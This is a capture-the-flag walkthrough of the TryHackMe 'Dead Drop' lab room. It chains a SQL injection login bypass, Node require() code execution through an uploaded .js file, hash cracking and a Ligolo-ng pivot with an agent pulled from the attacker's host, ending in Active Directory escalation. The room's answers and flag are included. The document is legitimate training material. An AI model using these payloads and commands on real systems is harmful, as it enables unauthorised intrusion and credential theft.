# TryHackMe: Dead Drop — Walkthrough

**Date:** 2026-10-28
**Room:** Dead Drop (Medium, Premium — AD network)
**Analyst:** Will Lawson
**Category:** Web Exploitation / Node.js RCE / Linux→Windows Pivot / Active Directory

---

## Overview

Dead Drop is a chained network engagement. I started with VPN access to a single DMZ web server (a Node.js file-sharing app) and had to work inward to a Windows domain controller I couldn't reach directly. The intended chain: exploit the web app for a foothold, crack a service account, pivot into the corporate LAN, pull domain credentials, and escalate through Active Directory to grab the flag off the Administrator's desktop.

**Static layout (from the room's network diagram):**

| Host | IP | Role |
| --- | --- | --- |
| WebServer (DeadDrop-WEB) | 192.168.11.200 | DMZ Linux web app — entry point |
| DEADDROP-WRK | 192.168.11.51 | Windows workstation (internal) |
| DEADDROP-DC | 192.168.11.100 | Domain controller (objective) |

Attacker (Kali on WSL): tun0 = 192.168.21.11.

**Answers:**

| Q | Answer |
| --- | --- |
| Q1 — SSH password for web server | `dropsofjupiter` |
| Q2 — Mobile app credentials | `j.harris:DropsOfJupiter2026!` |
| Q3 — Abusable AD permission | AddMember (WriteProperty on the `member` attribute of Domain Admins) |
| Q4 — Target group | Domain Admins (via the AddMember edge; also nested through ITSupport-Admins) |
| Q5 — DC flag | `THM{d34d_dr0p_d0m41n_pwn3d}` |

---

## 1. Enumeration — the web server

I started where I had access: 192.168.11.200.

```bash
nmap -sC -sV -p- --min-rate 2000 192.168.11.200 -oN deaddrop-web.nmap
```

Only two ports:

- **22** — OpenSSH 9.6p1 (patched, no version exploit)
- **80** — Node.js **Express**, redirecting to `/login`

SSH wasn't going to fall to a banner exploit, so the web app was the real door. `whatweb` confirmed Express with a password login form and nothing leaking in headers.

I spent real effort on content discovery here, and in hindsight most of it was wasted motion — but it's worth recording because it shaped how I (mis)read the app:

```bash
gobuster dir -u http://192.168.11.200 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x js,json,txt,apk -t 50
ffuf -u http://192.168.11.200/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -e .js,.json,.txt,.apk -ac -t 60
```

Both turned up only `login`, `logout`, `dashboard`. No APK, no static mount, no API. That emptiness was the first clue I misread: I assumed the "mobile application" from Q2 had to be hosted somewhere on the web server, and burned time fuzzing for it. It wasn't there — it lived on the box's filesystem, reachable only after I had a shell.

---

## 2. SQL injection — authentication bypass

The login page was a plain server-side form POST. I probed the backend. A NoSQL `$ne` payload got parsed but returned "Invalid credentials" cleanly, so it wasn't Mongo. Classic SQLi auth bypass was next:

```bash
curl -s -i -X POST http://192.168.11.200/login \
  --data-urlencode "username=admin' OR '1'='1'-- -" \
  --data-urlencode "password=x"
```

**302 → /dashboard** with a session cookie. In.

The dashboard was a file manager — upload, preview, rename, delete — with an empty file list. I ran sqlmap to characterise the injection properly:

```bash
sqlmap -u "http://192.168.11.200/login" --data="username=admin&password=x" \
  --method POST --batch --dbs --level 3 --risk 2
```

Back-end was **SQLite**, UNION-injectable on `username`, 3 columns. SQLite can't enumerate databases, so I went straight to tables → `users`:

```bash
sqlmap ... --batch --dump -T users
```

```
| id | password          | username   |
| 1  | SuperSecretAdm1n! | admin      |
| 2  | BackupAgent2024   | svc-backup |
```

Two plaintext app credentials. Neither worked against SSH, and the schema dump confirmed only id/username/password — no hidden column. **This was my first real course-correction:** I'd assumed one of these two was the SSH password (Q1). It wasn't. The SSH credential was a *third* secret I hadn't reached yet.

---

## 3. The long detour — everything the app sanitized

Before I found the actual vector, I methodically tested and ruled out every file-handling flaw I could think of against `/preview`, `/rename`, `/upload`, and `/delete`. Recording these because the negative results matter — they're what finally pointed me at the right bug:

- **Path traversal (read)** on `/preview/:filename` — every encoding (`%2f`, `%252f`, `....//`, null bytes, absolute paths) failed. The handler uses `path.basename()`, so traversal collapses to a filename inside `uploads/`.
- **Path traversal (write)** on `/upload` filename and `/rename` newName — both `path.basename()`-sanitized.
- **SQLi file read** — SQLite can't read local files.
- **SSTI** — uploaded `{{7*7}}` rendered literally in both content and filename. No template evaluation.
- **Command injection** — time-based `; sleep 5` on `/rename` and `/delete` returned in ~0.5s. Both use `fs.*`, no shell-out.
- **Prototype pollution** on the JSON login — no observable behaviour change.

At this point I was stuck, and the thing that unstuck me was realising I'd been reasoning about `/preview` like a **PHP LFI problem** when it was a **Node app**. The question wasn't "how do I read a file through preview" — it was "what does a Node app *do* with a file it previews."

---

## 4. The real vector — `require()` as RCE

The breakthrough: the dashboard, loaded in a real browser session, showed **pre-existing files** my curl sessions hadn't — including leftovers from earlier testers (`payload.js`, `reverse.js`) and room-seeded `.js` files. Previewing a `.js` file returned `Error loading module: ...` — the preview route doesn't *read* a `.js` file, it **`require()`s it as a Node module**, executing its top-level code.

The source (recovered via this very RCE) confirmed it:

```js
if (ext === '.js') {
  delete require.cache[require.resolve(filePath)];
  const moduleExport = require(filePath);   // executes the uploaded file
  // ...renders moduleExport as the "preview"
}
```

And the upload filter only blocked `.exe/.bat/.cmd/.ps1/.sh/.py` — **`.js` passed straight through**. So the exploit is: upload a `.js` that runs a command and throws its output, then GET `/preview/<file>.js` to read the result out of the error message.

```bash
C=$(curl -s -i -X POST http://192.168.11.200/login --data-urlencode "username=admin' OR '1'='1'-- -" --data-urlencode "password=x" | grep -i set-cookie | grep -o 'connect.sid=[^;]*')
cat > /tmp/r.js <<'EOF'
const { execSync } = require('child_process');
const sh = c => { try { return execSync(c + ' 2>&1 || true').toString(); } catch(e){ return 'ERR:'+e.message; } };
throw new Error('ROUT_B64:' + Buffer.from(sh('id')).toString('base64'));
EOF
curl -s -b "$C" -F 'file=@/tmp/r.js;filename=r.js' http://192.168.11.200/upload -o /dev/null
curl -s -b "$C" "http://192.168.11.200/preview/r.js" | grep -oE 'ROUT_B64:[A-Za-z0-9+/=]+' | sed 's/ROUT_B64://' | base64 -d
```

RCE as `uid=996(node)`. Two lessons baked in here: `execSync` aborts the whole command string on any non-zero exit (append `2>&1 || true` per command), and the preview page HTML-encodes output (`>` → `&gt;`), which corrupts shell redirects — base64-wrapping the output server-side and decoding locally dodges both.

---

## 5. Q1 — cracking svc-drop

With RCE as `node`, I hunted for the SSH credential. `/etc/shadow` wasn't readable, but the app directory had a **readable backup**:

```bash
# via the require() RCE:
cat /opt/app/backup/shadow.bak
# svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:...
```

sha512crypt, straight to hashcat:

```bash
echo '$6$f1331af25300c7f3$7twue...CCH0' > /tmp/svc.hash   # hash only, no username prefix
hashcat -m 1800 /tmp/svc.hash /usr/share/wordlists/rockyou.txt --quiet
# → dropsofjupiter
```

**Q1 = `dropsofjupiter`.** (One gotcha: hashcat won't load the hash with the `svc-drop:` prefix or trailing shadow fields — feed it the bare `$6$...` string.)

```bash
ssh svc-drop@192.168.11.200   # dropsofjupiter
# uid=1001(svc-drop) ... ens5: 192.168.11.200/24
```

The shell confirmed the box sits directly on 192.168.11.0/24 — my bridge into the internal network.

---

## 6. Pivot — Ligolo-ng

The DC and workstation were unreachable from Kali, so I tunneled through the web server with Ligolo-ng (v0.8.2).

```bash
# Kali — proxy
mkdir -p ~/ligolo && cd ~/ligolo
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_proxy_0.8.2_linux_amd64.tar.gz
wget -q https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.2/ligolo-ng_agent_0.8.2_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_* && tar xzf ligolo-ng_agent_* && chmod +x proxy agent
sudo ./proxy -selfcert

# Kali — serve agent
cd ~/ligolo && python3 -m http.server 8000

# on 192.168.11.200 (svc-drop)
cd /tmp && wget -q http://192.168.21.11:8000/agent -O agent && chmod +x agent
./agent -connect 192.168.21.11:11601 -ignore-cert &
```

In the proxy console:

```
session                                        # select the svc-drop agent
interface_create --name ligolo2                # let Ligolo own the interface
start --tun ligolo2
interface_add_route --name ligolo2 --route 192.168.11.51/32
interface_add_route --name ligolo2 --route 192.168.11.100/32
```

**Two snags worth noting for next time (both WSL-related):**

1. A manually-created `ligolo` tun interface (`ip tuntap add`) threw `interface ligolo not found` — Ligolo didn't register it. Fix: let Ligolo create its own via `interface_create`.
2. The interface sat `NO-CARRIER / state DOWN` because I'd run `start` *before* creating the interface. Re-running `start --tun ligolo2` after the interface existed brought carrier up.

Verified the pivot:

```bash
nxc smb 192.168.11.100
# DEADDROP-DC  (domain:deaddrop.loc) (signing:True) (Null Auth:True)  — Server 2019
```

Null/guest AD enumeration was locked down (guest disabled, RID brute over null returned nothing), which is the room telling you: go get real domain creds. Those were back on the box I already owned.

---

## 7. Q2 — the mobile application

Searching both app trees via the svc-drop shell turned up the provisioning script `/home/ubuntu/web-server/setup.sh`, which documented staging a **company APK**:

```
/home/ubuntu/web-server/apk/deaddrop-mobile.apk        (6.4 MB)
/home/svc-drop/backup/deaddrop-mobile.apk              (readable copy — setup.sh places it here)
```

This is the "internal mobile application" from Q2 — and because setup.sh copies it into svc-drop's home, I could read it directly without touching ubuntu's copy. (This is also where I'd wrongly assumed earlier the APK would be web-hosted; it was always a filesystem artifact gated behind the foothold.)

```bash
scp svc-drop@192.168.11.200:/home/svc-drop/backup/deaddrop-mobile.apk ~/   # dropsofjupiter
strings -n 6 ~/deaddrop-mobile.apk | grep -iE 'default_username|default_password|harris'
# → default_username, default_password, j.harris  (keys visible, values in resources.arsc)
apktool d -f ~/deaddrop-mobile.apk -o ~/deaddrop-apk
grep -niE 'default_username|default_password' ~/deaddrop-apk/res/values/strings.xml
# <string name="default_password">DropsOfJupiter2026!</string>
# <string name="default_username">j.harris</string>
```

**Q2 = `j.harris:DropsOfJupiter2026!`.** (jadx wasn't installed; apktool decodes `resources.arsc` into readable `strings.xml`, which is where the hardcoded values live — `strings` on the zipped APK only shows the resource *keys*.)

---

## 8. Active Directory — validating and escalating

```bash
nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!'
# [+] deaddrop.loc\j.harris:DropsOfJupiter2026! (Pwn3d!)
nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' --shares
# ADMIN$ / C$  READ,WRITE
```

`Pwn3d!` with full ADMIN$/C$ write — j.harris was already effectively Domain Admin. That was unexpected for a room advertising an ACL-escalation chain, so I grabbed the flag and then went back to characterise the privilege structure properly for Q3/Q4.

**Q5 — flag:**

```bash
nxc smb 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' --get-file 'Users/Administrator/Desktop/flag.txt' /tmp/flag.txt
cat /tmp/flag.txt
# THM{d34d_dr0p_d0m41n_pwn3d}
```

### Q3 / Q4 — the intended ACL chain

Enumerating privileged groups and membership via LDAP revealed the structure:

```
j.harris  ──member──▶  ITSupport-Admins  ──member──▶  Domain Admins  ──member──▶  Administrators (Builtin)
```

So **ITSupport-Admins** is a custom group nested inside Domain Admins, and j.harris is in it — hence the direct `Pwn3d!`.

Reading the DACL of the Domain Admins group showed the *intended* abusable edge, separate from the nesting:

```bash
nxc ldap 192.168.11.100 -u j.harris -p 'DropsOfJupiter2026!' -M daclread -o TARGET='Domain Admins' ACTION=read
# ACE: ACCESS_ALLOWED_OBJECT_ACE
#   Access mask : WriteProperty
#   Object type : Member
#   Trustee     : j.harris
```

j.harris holds **WriteProperty on the `member` attribute of Domain Admins** — i.e. **AddMember**. That's the designed escalation: add any account (including yourself) to Domain Admins.

- **Q3 = AddMember** (WriteProperty on Domain Admins' `member` attribute)
- **Q4 = Domain Admins** (the group reached via that edge; also reachable through the ITSupport-Admins nesting)

---

## 9. On the "shortcut"

The room shipped **two overlapping escalation paths from j.harris**:

1. **Intended:** j.harris has an `AddMember` ACL on Domain Admins → add yourself → DA.
2. **Redundant:** j.harris is nested (via ITSupport-Admins) *inside* Domain Admins already → DA on login.

Because path 2 existed, the j.harris credential alone granted Domain Admin, and actively abusing the ACL from path 1 was never necessary — the flag came out with a single `--get-file`. We didn't cheat; we used a legitimate finding that happened to collapse the intended workflow. Whether the nesting is a deliberate "two ways in" design or an over-provisioning slip by the author is ambiguous, but either way Q3/Q4 were really testing whether you can *recognise and document* the privilege structure, not whether you mechanically ran the AddMember attack. I documented both.

---

## Full Attack Chain

```
VPN → 192.168.11.200 (DMZ web app, Node/Express)
  │
  ├─ SQLi auth bypass on /login (SQLite, string concat) → app DB (admin, svc-backup — red herrings)
  └─ /preview require()s uploaded .js  → RCE as node (uid 996)
        │  (upload filter blocks .sh/.py/.exe, NOT .js)
        └─ read /opt/app/backup/shadow.bak → svc-drop $6$ hash

svc-drop hash → hashcat (rockyou) → "dropsofjupiter"  [Q1]
  │
  └─ SSH svc-drop@192.168.11.200  (box is on 192.168.11.0/24)

Ligolo-ng pivot through svc-drop → routes to .51/.100
  │
  └─ setup.sh → /home/svc-drop/backup/deaddrop-mobile.apk
        └─ apktool → strings.xml → j.harris:DropsOfJupiter2026!  [Q2]

j.harris on DEADDROP-DC (deaddrop.loc)
  ├─ (Pwn3d!) ADMIN$/C$ write → Administrator desktop flag  [Q5]
  ├─ DACL: WriteProperty on Domain Admins 'member' = AddMember  [Q3]
  └─ target group: Domain Admins (also nested via ITSupport-Admins)  [Q4]
```

---

## Key Techniques & Gotchas

| Technique | Detail |
|-----------|--------|
| **Node `require()` RCE** | Preview route `require()`s uploaded `.js` — top-level code executes. Exfil via `throw new Error(base64(output))`. The vector, not LFI/SSTI/cmdi — all of which were sanitized. |
| **Think Node, not PHP** | I lost the most time treating `/preview` as PHP-style LFI. `path.basename()` kills traversal; the Node-native bug is module loading. |
| **execSync aborts on non-zero** | Chained commands die on the first failure — append `2>&1 \|\| true` per command. |
| **HTML-encoded output** | Preview escapes `>`/`&`, corrupting shell redirects in exfil — base64 the output server-side. |
| **hashcat hash format** | `$6$` won't load with the `user:` prefix or trailing shadow fields — strip to the bare hash. |
| **Ligolo on WSL** | Let Ligolo `interface_create` its own tun (manual `ip tuntap` → "interface not found"); run `start` AFTER the interface exists or it stays NO-CARRIER/DOWN. |
| **APK creds in resources** | `strings` shows only resource *keys*; `apktool d` decodes `resources.arsc` → `res/values/strings.xml` holds the actual values. |
| **Redundant AD paths** | A credential that's already nested into a privileged group can collapse an intended ACL-abuse exercise. Document the ACL anyway. |

---

## Lessons Learned

1. **Empty content-discovery results are data, not a dead end.** The APK wasn't web-hosted; the emptiness should have told me Q2's artifact lived on the filesystem behind the foothold, not pushed me into more fuzzing.
2. **Match the exploit model to the stack.** "Preview a file" means `fs.readFile` in some stacks and `require()` in others. I ruled out LFI/SSTI/cmdi correctly but was slow to ask the Node-specific question.
3. **Separate sessions can see separate state.** My SQLi-bypass curl session and a real browser login surfaced different upload listings; the seeded `.js` files were only visible in the browser view, and that's what revealed the `require()` behaviour.
4. **Validate creds before building tooling.** One `nxc smb` with j.harris answered the whole AD section in seconds and saved a full BloodHound collection run.
